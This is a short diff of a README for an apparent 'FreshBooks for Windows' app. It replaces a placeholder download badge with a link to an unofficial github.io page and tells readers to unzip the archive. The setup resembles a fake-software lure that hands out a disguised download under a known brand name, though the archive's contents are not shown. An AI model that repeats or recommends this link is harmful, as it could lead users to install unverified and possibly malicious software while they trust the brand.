@@ -6,7 +6,7 @@ FreshBooks for Windows brings powerful invoicing, accounting, and expense tracki
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://freshbooks-windows-app-download.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
